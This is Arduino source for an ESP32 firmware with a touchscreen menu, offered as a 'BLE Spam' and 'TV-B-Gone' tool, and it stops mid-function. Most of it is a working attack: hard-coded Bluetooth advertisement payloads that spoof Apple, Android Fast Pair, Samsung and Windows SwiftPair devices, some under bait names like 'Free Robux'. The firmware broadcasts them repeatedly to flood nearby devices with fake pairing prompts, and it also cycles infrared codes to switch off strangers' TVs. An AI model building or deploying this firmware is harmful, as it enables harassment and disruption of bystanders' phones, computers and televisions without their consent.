// RFXCORE // NEMO-STYLE MINIMAL UI // ESP32 Apple Juice + Android BLE Spam Firmware v4.3 + TV-B-Gone IR
// MINIMALISTIC UI LIKE NEMO FIRMWARE - SIMPLE TEXT, LIGHT-PURPLE ACCENTS
// TFT 240x320 landscape, ориентация 1

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <SPI.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <WiFi.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

// Конфигурация дисплея 240x320 landscape
#define TFT_BL   4
#define TFT_ROT  1  // Landscape orientation

// ========== TOUCHSCREEN CONFIGURATION ==========
#define TOUCH_CS   21    // T_CS
#define TOUCH_IRQ  5     // T_IRQ (optional)

XPT2046_Touchscreen touchscreen(TOUCH_CS, TOUCH_IRQ);

// Touch calibration values (adjust these if needed)
#define TS_MINX 200
#define TS_MAXX 3700
#define TS_MINY 240
#define TS_MAXY 3800

// ИК-передатчик
#define IR_PIN 32
IRsend irsend(IR_PIN);

// Touch variables
bool touchDetected = false;
int touchX = 0, touchY = 0;
unsigned long lastTouchTime = 0;
const int TOUCH_DEBOUNCE = 200;  // ms debounce time

// ========== EXISTING BUTTON CODE ==========
const int boutonBoot = 0;
const int ledPin = 2;

// Глобальные объекты
TFT_eSPI tft = TFT_eSPI();
BLEAdvertising *pAdvertising;

// Состояния системы
enum SystemState {
  STATE_MAIN_MENU,          // Главное меню
  STATE_DEVICE_MENU,        // Меню выбора устройства BLE
  STATE_ACTIVE,             // Режим работы BLE
  STATE_INACTIVE,           // Ожидание BLE
  STATE_ABOUT,              // Информация о системе
  STATE_TVBGONE_MENU,       // Меню TV-B-Gone
  STATE_TVBGONE_ACTIVE,     // Активная атака TV-B-Gone
  STATE_TVBGONE_REGIONS,    // Выбор региона TV-B-Gone
  STATE_TVBGONE_CUSTOM      // Пользовательские коды (зарезервировано)
};

SystemState currentState = STATE_MAIN_MENU;
int dernierEtatBouton = HIGH;

// Тайминги для двойного нажатия
unsigned long lastPressTime = 0;
unsigned long lastReleaseTime = 0;
bool waitingForSecondPress = false;
const int DOUBLE_PRESS_DELAY = 500;

// Переменные для отслеживания кнопки
unsigned long debounceTime = 0;
const int DEBOUNCE_DELAY = 50;

// NEMO MINIMAL COLOR PALETTE
#define NEMO_BG      0x0000      // Black background
#define NEMO_TEXT    0xc959      // White text
#define NEMO_ACCENT  0xc959      // Light purple accent (like Nemo firmware)
#define NEMO_GREEN   0x07E0      // Green for active
#define NEMO_RED     0xF800      // Red for stop
#define NEMO_BLUE    0x001F      // Blue for selection
#define NEMO_GRAY    0x8410      // Gray for inactive
#define NEMO_ORANGE  0xFD20      // Orange for TV-B-Gone

// Структура для статистики BLE
struct Stats {
  uint32_t packets_sent = 0;
  uint32_t last_update = 0;
  uint8_t packets_per_sec = 0;
} stats;

// ========== ВСЕ УСТРОЙСТВА BLE ==========

struct Device {
  uint8_t id;
  const char* name;
  uint8_t type; // 0=Apple, 1=Android, 2=Samsung, 3=Windows
  uint32_t model;
  uint8_t data[31];
  size_t length;
  const char* protocol;
};

// 20 устройств BLE
Device allDevices[] = {
  // Apple (6 устройств)
  {0, "Airpods 1st", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {1, "Airpods Pro", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {2, "Airpods Max", 0, 0, {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 31, "Apple"},
  {3, "AppleTV Setup", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  {4, "AppleTV Pair", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  {5, "Homepod Setup", 0, 0, {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00}, 23, "Apple"},
  
  // Android Fast Pair (8 устройств)
  {6, "Pixel Buds", 1, 0x92BBBD, {}, 0, "Android"},
  {7, "Bose 700", 1, 0xCD8256, {}, 0, "Android"},
  {8, "JBL Flip", 1, 0x821F66, {}, 0, "Android"},
  {9, "Sony XM5", 1, 0xD446A7, {}, 0, "Android"},
  {10, "Galaxy S21", 1, 0x06AE20, {}, 0, "Android"},
  {11, "Free Robux", 1, 0x77FF67, {}, 0, "Android"},
  {12, "Free VBucks", 1, 0xAA187F, {}, 0, "Android"},
  {13, "Windows 11", 1, 0xFDEE23, {}, 0, "Android"},
  
  // Samsung (4 устройства)
  {14, "Samsung Watch", 2, 0x1A, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x1A}, 15, "Samsung"},
  {15, "Samsung TV", 2, 0x01, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x01}, 15, "Samsung"},
  {16, "Galaxy Tab", 2, 0x02, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x02}, 15, "Samsung"},
  {17, "Samsung Phone", 2, 0x03, {0x0F,0xFF,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43,0x03}, 15, "Samsung"},
  
  // Windows SwiftPair (2 устройства)
  {18, "SwiftPair PC", 3, 0, {}, 0, "Windows"},
  {19, "Random Device", 3, 0, {}, 0, "Windows"}
};

const int TOTAL_DEVICES = 20;
int currentDeviceIndex = 0;
int scrollOffset = 0;
const int VISIBLE_ITEMS = 5;
bool isActive = false;
int delaySeconds = 3;

// Главное меню
enum MainMenuOption {
  MENU_BLE_ATTACK,
  MENU_TVBGONE_ATTACK,
  MENU_ABOUT,
  MENU_TOTAL
};

int currentMainMenuOption = MENU_BLE_ATTACK;

// ========== TV-B-GONE VARIABLES ==========

// Регионы для TV-B-Gone
enum Region {
  REGION_EUROPE,
  REGION_AMERICAS,
  REGION_ASIA_PACIFIC,
  REGION_ALL,
  REGION_TOTAL
};

const char* region_names[] = {
  "EUROPE",
  "AMERICAS",
  "ASIA PACIFIC",
  "ALL REGIONS"
};

// Структура для ИК-кодов выключения
struct IRCode {
  uint16_t frequency;       // Частота в Гц (обычно 38000)
  uint8_t duty_cycle;       // Скважность (обычно 33%)
  uint16_t *raw_data;       // Сырые данные таймингов
  uint16_t length;          // Длина данных
  const char* brand_name;   // Название бренда
  uint8_t region;           // Регион (0=все, 1=Европа, 2=Америка, 3=Азия)
};

// Примеры ИК-кодов для TV-B-Gone (упрощенные)
static uint16_t power_code_samsung[] = {
  4500, 4500, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 
  560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560
};

static uint16_t power_code_lg[] = {
  4500, 4500, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560,
  560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 1680
};

static uint16_t power_code_sony[] = {
  2400, 600, 1200, 600, 600, 600, 1200, 600, 600, 600, 600, 600, 1200, 600, 600, 600,
  600, 600, 600, 600, 1200, 600, 600, 600, 600, 600, 600, 600, 600, 600, 1200, 600
};

static uint16_t power_code_panasonic[] = {
  3450, 1700, 400, 1300, 400, 1300, 400, 1300, 400, 400, 400, 400, 400, 400, 400, 1300,
  400, 1300, 400, 400, 400, 1300, 400, 400, 400, 400, 400, 400, 400, 1300, 400, 1300
};

static uint16_t power_code_philips[] = {
  9000, 4500, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560,
  560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560, 560
};

// Массив брендов для TV-B-Gone
IRCode tvb_codes[] = {
  {38000, 33, power_code_samsung, 32, "Samsung", REGION_ALL},
  {38000, 33, power_code_lg, 32, "LG", REGION_ALL},
  {38000, 33, power_code_sony, 32, "Sony", REGION_ALL},
  {38000, 33, power_code_panasonic, 32, "Panasonic", REGION_ALL},
  {38000, 33, power_code_philips, 32, "Philips", REGION_EUROPE}
};

const int TOTAL_TV_CODES = 5;

// Статистика TV-B-Gone
struct TVBGoneStats {
  uint32_t codes_sent = 0;
  uint32_t brands_completed = 0;
  bool is_active = false;
  uint8_t current_region = REGION_ALL;
} tvb_stats;

// Текущие настройки атаки
int currentRegion = REGION_ALL;
bool tvbAttackInProgress = false;
unsigned long lastCodeSent = 0;
const unsigned long CODE_INTERVAL = 1500; // Интервал между кодами в мс

// ========== NEMO MINIMAL UI FUNCTIONS ==========

void initNemoDisplay() {
  tft.init();
  tft.setRotation(TFT_ROT);
  tft.fillScreen(NEMO_BG);
  
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  drawTopBar();
}

void drawTopBar() {
  // Простая верхняя панель как в Nemo firmware
  tft.fillRect(0, 0, 320, 30, NEMO_BG);
  tft.drawFastHLine(0, 29, 320, NEMO_ACCENT);
  
  // Логотип Nemo в левом верхнем углу
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.setCursor(5, 8);
  tft.print("Apple32");
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setCursor(5, 18);
  tft.print("esp32-devkit-v1");
  
  // Статус справа
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setCursor(280, 8);
  tft.print("BLE");
  
  tft.setCursor(280, 18);
  tft.print("IR");
}

void drawNemoMenuOption(int y, const char* text, bool selected) {
  if (selected) {
    tft.setTextColor(NEMO_ACCENT, NEMO_BG);
    tft.drawCentreString(">", 40, y, 2);
    tft.drawCentreString(text, 160, y, 2);
    tft.drawCentreString("<", 280, y, 2);
  } else {
    tft.setTextColor(NEMO_TEXT, NEMO_BG);
    tft.drawCentreString(text, 160, y, 2);
  }
}

void showNemoMainMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  // Заголовок
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("Apple32r1-FW", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("BLE Spam + TV-B-Gone", 160, 70, 2);
  
  // Разделительная линия
  tft.drawFastHLine(50, 85, 220, NEMO_ACCENT);
  
  // Опции меню
  tft.setTextSize(2);
  drawNemoMenuOption(110, "BLE DEVICE SPAM", currentMainMenuOption == MENU_BLE_ATTACK);
  drawNemoMenuOption(150, "TV-B-GONE IR", currentMainMenuOption == MENU_TVBGONE_ATTACK);
  drawNemoMenuOption(190, "SYSTEM INFO", currentMainMenuOption == MENU_ABOUT);
  
  // Инструкция
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("", 160, 235, 1);
}

void showNemoDeviceMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  // Заголовок
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT DEVICE", 160, 45, 2);
  
  // Список устройств
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIdx = scrollOffset + i;
    if (deviceIdx >= TOTAL_DEVICES) break;
    
    int yPos = 80 + (i * 28);
    
    if (deviceIdx == currentDeviceIndex) {
      tft.setTextColor(NEMO_ACCENT, NEMO_BG);
      tft.drawString(">", 20, yPos, 2);
    } else {
      tft.setTextColor(NEMO_TEXT, NEMO_BG);
    }
    
    // Имя устройства
    String displayName = allDevices[deviceIdx].name;
    if (displayName.length() > 16) {
      displayName = displayName.substring(0, 16);
    }
    tft.drawString(displayName, 40, yPos, 2);
    
    // Протокол
    tft.setTextSize(1);
    tft.drawString(allDevices[deviceIdx].protocol, 240, yPos + 5, 1);
    tft.setTextSize(2);
  }
  
  // Индикатор прокрутки
  if (TOTAL_DEVICES > VISIBLE_ITEMS) {
    tft.drawString("v", 305, 140, 1);
  }
  
  // Номер устройства
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Device " + String(currentDeviceIndex + 1) + "/" + String(TOTAL_DEVICES), 160, 220, 2);
  
  tft.drawCentreString("Touch to select | BOOT to confirm", 160, 235, 1);
}

void showNemoAttackInterface() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  // Левая часть - статус
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawString("STATUS:", 20, 60, 2);
  
  // Правая часть - статистика
  tft.drawString("STATS:", 180, 60, 2);
  
  // Разделитель
  tft.drawFastVLine(160, 80, 100, NEMO_ACCENT);
  
  // Нижняя часть - устройство
  tft.drawFastHLine(20, 150, 280, NEMO_ACCENT);
  tft.drawString("DEVICE:", 20, 160, 2);
  
  updateNemoStatus(false);
  updateNemoStats();
  updateNemoDevice();
  
  // Инструкции
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Touch STATUS: Start/Stop", 160, 220, 1);
  tft.drawCentreString("Touch DEVICE: Change", 160, 235, 1);
}

void updateNemoStatus(bool active) {
  tft.fillRect(20, 80, 120, 40, NEMO_BG);
  
  if (active) {
    tft.setTextColor(NEMO_GREEN, NEMO_BG);
    tft.drawString("ACTIVE", 20, 80, 2);
    tft.fillCircle(120, 90, 5, NEMO_GREEN);
  } else {
    tft.setTextColor(NEMO_RED, NEMO_BG);
    tft.drawString("INACTIVE", 20, 80, 2);
    tft.fillCircle(120, 90, 5, NEMO_RED);
  }
}

void updateNemoStats() {
  if (millis() - stats.last_update >= 1000) {
    stats.packets_per_sec = stats.packets_sent - (stats.last_update ? stats.packets_sent : 0);
    stats.last_update = millis();
  }
  
  tft.fillRect(180, 80, 120, 40, NEMO_BG);
  
  char buffer[20];
  sprintf(buffer, "PKTS: %lu", stats.packets_sent);
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.drawString(buffer, 180, 80, 2);
  
  sprintf(buffer, "PPS: %d", stats.packets_per_sec);
  tft.drawString(buffer, 180, 100, 2);
}

void updateNemoDevice() {
  Device* device = &allDevices[currentDeviceIndex];
  
  tft.fillRect(20, 180, 280, 30, NEMO_BG);
  
  String displayName = device->name;
  if (displayName.length() > 20) {
    displayName = displayName.substring(0, 20);
  }
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawString(displayName, 100, 180, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawString(device->protocol, 100, 200, 1);
}

void showNemoTVBGoneMenu() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("TV-B-GONE IR", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(2);
  
  tft.drawCentreString("> SELECT REGION", 160, 100, 2);
  tft.drawCentreString("  START ATTACK", 160, 140, 2);
  tft.drawCentreString("  BACK TO MENU", 160, 180, 2);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("IR Transmitter: GPIO32", 160, 235, 1);
}

void showNemoTVBRegions() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SELECT REGION", 160, 45, 2);
  
  for (int i = 0; i < REGION_TOTAL; i++) {
    int yPos = 90 + (i * 35);
    
    if (currentRegion == i) {
      tft.setTextColor(NEMO_ACCENT, NEMO_BG);
      tft.drawCentreString("> " + String(region_names[i]), 160, yPos, 2);
    } else {
      tft.setTextColor(NEMO_TEXT, NEMO_BG);
      tft.drawCentreString("  " + String(region_names[i]), 160, yPos, 2);
    }
  }
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Selected: " + String(region_names[currentRegion]), 160, 220, 2);
  tft.drawCentreString("Press BOOT to start", 160, 235, 1);
}

void showNemoTVBActive() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("TV-B-GONE ACTIVE", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  tft.drawCentreString("Region: " + String(region_names[currentRegion]), 160, 80, 2);
  
  // Статистика
  char buffer[30];
  sprintf(buffer, "Codes sent: %lu", tvb_stats.codes_sent);
  tft.drawCentreString(buffer, 160, 110, 2);
  
  int currentBrand = (tvb_stats.codes_sent % TOTAL_TV_CODES);
  if (currentBrand < TOTAL_TV_CODES) {
    sprintf(buffer, "Current: %s", tvb_codes[currentBrand].brand_name);
    tft.drawCentreString(buffer, 160, 130, 2);
  }
  
  // Индикатор ИК
  tft.drawCentreString("IR Transmitting...", 160, 170, 2);
  
  // Кнопка остановки
  tft.setTextColor(NEMO_RED, NEMO_BG);
  tft.drawCentreString("[ STOP ]", 160, 200, 2);
  
  // Мигающий индикатор
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(160, 220, 4, blink ? NEMO_ORANGE : NEMO_BG);
  tft.drawCircle(160, 220, 4, NEMO_ORANGE);
}

void updateNemoTVBStats() {
  if (currentState != STATE_TVBGONE_ACTIVE) return;
  
  tft.fillRect(0, 100, 320, 60, NEMO_BG);
  
  char buffer[30];
  sprintf(buffer, "Codes sent: %lu", tvb_stats.codes_sent);
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.drawCentreString(buffer, 160, 110, 2);
  
  int currentBrand = (tvb_stats.codes_sent % TOTAL_TV_CODES);
  if (currentBrand < TOTAL_TV_CODES) {
    sprintf(buffer, "Current: %s", tvb_codes[currentBrand].brand_name);
    tft.drawCentreString(buffer, 160, 130, 2);
  }
}

void showNemoAbout() {
  tft.fillRect(0, 30, 320, 210, NEMO_BG);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.setTextSize(2);
  tft.drawCentreString("SYSTEM INFO", 160, 45, 2);
  
  tft.setTextColor(NEMO_TEXT, NEMO_BG);
  tft.setTextSize(1);
  
  tft.drawCentreString("RFXCORE NEMO UI v5.0", 160, 80, 2);
  tft.drawCentreString("BLE Spam + TV-B-Gone", 160, 100, 2);
  tft.drawCentreString("20 BLE Devices | 5 IR Brands", 160, 115, 2);
  tft.drawCentreString("TFT 240x320 + Touch", 160, 130, 2);
  
  tft.drawCentreString("BLE Power: +9dBm", 160, 155, 1);
  tft.drawCentreString("IR Frequency: 38kHz", 160, 170, 1);
  tft.drawCentreString("IR Pin: GPIO 32", 160, 185, 1);
  
  tft.setTextColor(NEMO_ACCENT, NEMO_BG);
  tft.drawCentreString("Touch to return", 160, 235, 1);
}

// ========== TOUCHSCREEN FUNCTIONS ==========

void initTouchscreen() {
  Serial.println("[TOUCH] Initializing touchscreen...");
  
  touchscreen.begin();
  touchscreen.setRotation(1);
  
  Serial.println("[TOUCH] Touchscreen ready");
}

void checkTouch() {
  if (touchscreen.touched()) {
    unsigned long currentTime = millis();
    
    if (currentTime - lastTouchTime < TOUCH_DEBOUNCE) return;
    
    TS_Point p = touchscreen.getPoint();
    
    // Используем корректное преобразование координат
    touchX = map(4095 - p.y, TS_MINY, TS_MAXY, 0, 320);
    touchY = map(4095 - p.x, TS_MINX, TS_MAXX, 0, 240);
    
    // Ensure within bounds
    if (touchX < 0) touchX = 0;
    if (touchX > 319) touchX = 319;
    if (touchY < 0) touchY = 0;
    if (touchY > 239) touchY = 239;
    
    lastTouchTime = currentTime;
    touchDetected = true;
    
    Serial.printf("[TOUCH] Raw: X=%d, Y=%d | Mapped: X=%d, Y=%d\n", p.x, p.y, touchX, touchY);
  } else {
    touchDetected = false;
  }
}

void handleTouchInput() {
  if (!touchDetected) return;
  
  Serial.printf("[TOUCH] X=%d, Y=%d, State=%d\n", touchX, touchY, currentState);
  
  switch(currentState) {
    case STATE_MAIN_MENU:
      handleMainMenuTouch();
      break;
      
    case STATE_DEVICE_MENU:
      handleDeviceMenuTouch();
      break;
      
    case STATE_INACTIVE:
      handleInactiveTouch();
      break;
      
    case STATE_ACTIVE:
      handleActiveTouch();
      break;
      
    case STATE_ABOUT:
      handleAboutTouch();
      break;
      
    case STATE_TVBGONE_MENU:
      handleTVBGoneMenuTouch();
      break;
      
    case STATE_TVBGONE_REGIONS:
      handleTVBRegionsTouch();
      break;
      
    case STATE_TVBGONE_ACTIVE:
      handleTVBActiveTouch();
      break;
  }
  
  touchDetected = false;
}

void handleMainMenuTouch() {
  if (touchY >= 100 && touchY <= 130) {  // BLE Attack
    currentState = STATE_DEVICE_MENU;
    showNemoDeviceMenu();
    Serial.println("[TOUCH] Selected: BLE Attack");
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
  else if (touchY >= 140 && touchY <= 170) {  // TV-B-Gone
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
    Serial.println("[TOUCH] Selected: TV-B-Gone");
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
  else if (touchY >= 180 && touchY <= 210) {  // About
    currentState = STATE_ABOUT;
    showNemoAbout();
    Serial.println("[TOUCH] Selected: About");
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
}

void handleDeviceMenuTouch() {
  for (int i = 0; i < VISIBLE_ITEMS; i++) {
    int deviceIndex = scrollOffset + i;
    if (deviceIndex >= TOTAL_DEVICES) break;
    
    int yPos = 80 + (i * 28);
    int yStart = yPos - 5;
    int yEnd = yStart + 20;
    
    if (touchX >= 20 && touchX <= 300 && 
        touchY >= yStart && touchY <= yEnd) {
      currentDeviceIndex = deviceIndex;
      currentState = STATE_INACTIVE;
      showNemoAttackInterface();
      
      Serial.printf("[TOUCH] Selected device: %s\n", allDevices[currentDeviceIndex].name);
      
      for (int j = 0; j < 2; j++) {
        digitalWrite(ledPin, HIGH);
        delay(80);
        digitalWrite(ledPin, LOW);
        delay(80);
      }
      break;
    }
  }
  
  if (touchX >= 300 && touchX <= 320 && touchY >= 80 && touchY <= 200) {
    scrollOffset++;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) {
      scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    }
    showNemoDeviceMenu();
    Serial.printf("[TOUCH] Scrolled to offset: %d\n", scrollOffset);
  }
}

void handleInactiveTouch() {
  if (touchY >= 80 && touchY <= 120) {
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(ledPin, HIGH);
    updateNemoStatus(true);
    Serial.println("[TOUCH] Started BLE attack");
  }
  else if (touchY >= 160 && touchY <= 200) {
    currentState = STATE_DEVICE_MENU;
    showNemoDeviceMenu();
    Serial.println("[TOUCH] Back to device selection");
  }
}

void handleActiveTouch() {
  if (touchY >= 80 && touchY <= 120) {
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
    updateNemoStatus(false);
    Serial.println("[TOUCH] Stopped BLE attack");
  }
}

void handleAboutTouch() {
  currentState = STATE_MAIN_MENU;
  showNemoMainMenu();
  Serial.println("[TOUCH] Returned to main menu");
  
  digitalWrite(ledPin, HIGH);
  delay(100);
  digitalWrite(ledPin, LOW);
}

void handleTVBGoneMenuTouch() {
  if (touchY >= 100 && touchY <= 130) {
    currentState = STATE_TVBGONE_REGIONS;
    showNemoTVBRegions();
    Serial.println("[TOUCH] Selected: TV-B-Gone Region Select");
  }
  else if (touchY >= 140 && touchY <= 170) {
    currentState = STATE_TVBGONE_ACTIVE;
    tvb_stats.is_active = true;
    tvb_stats.codes_sent = 0;
    showNemoTVBActive();
    Serial.println("[TOUCH] Started TV-B-Gone attack");
  }
  else if (touchY >= 180 && touchY <= 210) {
    currentState = STATE_MAIN_MENU;
    showNemoMainMenu();
    Serial.println("[TOUCH] Back to main menu");
  }
  
  digitalWrite(ledPin, HIGH);
  delay(100);
  digitalWrite(ledPin, LOW);
}

void handleTVBRegionsTouch() {
  for (int i = 0; i < REGION_TOTAL; i++) {
    int yPos = 90 + (i * 35);
    int yStart = yPos - 5;
    int yEnd = yStart + 25;
    
    if (touchX >= 50 && touchX <= 270 && 
        touchY >= yStart && touchY <= yEnd) {
      currentRegion = i;
      tvb_stats.current_region = i;
      showNemoTVBRegions();
      Serial.printf("[TOUCH] Selected region: %s\n", region_names[i]);
      
      digitalWrite(ledPin, HIGH);
      delay(80);
      digitalWrite(ledPin, LOW);
      break;
    }
  }
}

void handleTVBActiveTouch() {
  if (touchY >= 190 && touchY <= 210) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
    Serial.println("[TOUCH] Stopped TV-B-Gone attack");
  }
}

// ========== TV-B-GONE FUNCTIONS ==========

void initTVBGone() {
  irsend.begin();
  Serial.println("[TVB-Gone] IR transmitter initialized on GPIO 32");
}

void sendIRPowerCode(IRCode* code) {
  if (!code) return;
  
  if (currentRegion != REGION_ALL && code->region != REGION_ALL && code->region != currentRegion) {
    Serial.printf("[TVB-Gone] Skipping %s (wrong region)\n", code->brand_name);
    return;
  }
  
  irsend.sendRaw(code->raw_data, code->length, code->frequency);
  tvb_stats.codes_sent++;
  
  Serial.printf("[TVB-Gone] Sent %s power code (Freq: %dHz, Len: %d)\n", 
                code->brand_name, code->frequency, code->length);
  
  digitalWrite(ledPin, HIGH);
  delay(50);
  digitalWrite(ledPin, LOW);
}

void processTVBGoneAttack() {
  if (!tvb_stats.is_active) return;
  
  static unsigned long lastCodeTime = 0;
  static int currentCodeIndex = 0;
  
  if (millis() - lastCodeTime >= CODE_INTERVAL) {
    if (currentCodeIndex < TOTAL_TV_CODES) {
      sendIRPowerCode(&tvb_codes[currentCodeIndex]);
      currentCodeIndex++;
      lastCodeTime = millis();
      
      if (currentState == STATE_TVBGONE_ACTIVE) {
        updateNemoTVBStats();
      }
      
      if (currentCodeIndex >= TOTAL_TV_CODES) {
        currentCodeIndex = 0;
        tvb_stats.brands_completed++;
        Serial.println("[TVB-Gone] Completed full cycle, starting over");
      }
    }
  }
}

// ========== BLE FUNCTIONS ==========

void sendAttackPacket() {
  Device* device = &allDevices[currentDeviceIndex];
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  
  if (device->type == 0) {
    String appleData = "";
    for (size_t i = 0; i < device->length; i++) {
      appleData += (char)device->data[i];
    }
    advertisementData.addData(appleData);
  }
  else if (device->type == 1) {
    uint32_t model = device->model;
    String fpData = "";
    fpData += (char)0x03;
    fpData += (char)0x03;
    fpData += (char)0x2C;
    fpData += (char)0xFE;
    fpData += (char)0x06;
    fpData += (char)0x16;
    fpData += (char)0x2C;
    fpData += (char)0xFE;
    fpData += (char)((model >> 16) & 0xFF);
    fpData += (char)((model >> 8) & 0xFF);
    fpData += (char)(model & 0xFF);
    fpData += (char)0x00;
    fpData += (char)0x00;
    fpData += (char)0x00;
    
    advertisementData.addData(fpData);
  }
  else if (device->type == 2) {
    String samsungData = "";
    for (size_t i = 0; i < device->length; i++) {
      samsungData += (char)device->data[i];
    }
    advertisementData.addData(samsungData);
  }
  else if (device->type == 3) {
    String spData = "";
    spData += (char)0x0C;
    spData += (char)0xFF;
    spData += (char)0x06;
    spData += (char)0x00;
    spData += (char)0x03;
    spData += (char)0x00;
    spData += (char)0x80;
    spData += (char)0x57;  // W
    spData += (char)0x69;  // i
    spData += (char)0x6E;  // n
    spData += (char)0x64;  // d
    spData += (char)0x6F;  // o
    spData += (char)0x77;  // w
    
    advertisementData.addData(spData);
  }
  
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  stats.packets_sent++;
  delay(100);
  pAdvertising->stop();
  
  if (stats.packets_sent % 5 == 0) {
    updateNemoStats();
  }
}

// ========== BUTTON FUNCTIONS ==========

void handleButton() {
  int etatBouton = digitalRead(boutonBoot);
  unsigned long currentTime = millis();
  
  if (currentTime - debounceTime < DEBOUNCE_DELAY) {
    dernierEtatBouton = etatBouton;
    return;
  }
  
  if (etatBouton == LOW && dernierEtatBouton == HIGH) {
    debounceTime = currentTime;
    lastPressTime = currentTime;
    
    if (waitingForSecondPress && (currentTime - lastReleaseTime) < DOUBLE_PRESS_DELAY) {
      waitingForSecondPress = false;
      
      if (currentState == STATE_DEVICE_MENU) {
        currentState = STATE_INACTIVE;
        showNemoAttackInterface();
        
